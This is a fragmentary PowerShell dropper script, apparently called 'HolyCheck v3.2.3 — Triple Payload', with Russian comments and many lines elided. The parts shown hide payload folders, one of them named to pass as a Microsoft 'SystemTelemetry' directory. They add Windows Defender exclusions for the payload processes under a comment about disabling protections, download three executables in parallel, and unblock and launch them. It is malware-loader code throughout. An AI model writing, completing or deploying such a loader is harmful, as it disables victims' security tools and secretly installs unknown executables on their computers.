# ================================================================
# HolyCheck v3.2.3 — Triple Payload (три EXE)
# ================================================================
...
# Папка и имя для третьего файла (telemetry.exe)
 $Dir3 = "$env:APPDATA\Microsoft\SystemTelemetry"
...
# Скрываем вторую и третью папки
attrib +h "$Dir2" 2>$null
attrib +h "$Dir3" 2>$null

# --- Отключение защит (для всех трёх) ---
try {
    ...
    Add-MpPreference -ExclusionProcess (Split-Path $Exe3 -Leaf) -ErrorAction Stop
} catch {}
try {
...
# --- Запускаем загрузку трёх файлов параллельно ---
...
# Ждём завершения загрузки (до 30 секунд)
...
Remove-Job -Job $job1 -Force; Remove-Job -Job $job2 -Force; Remove-Job -Job $job3 -Force
...
# --- Разблокировка и запуск второго ---
...
# --- Разблокировка и запуск третьего (БЕЗ автозагрузки) ---
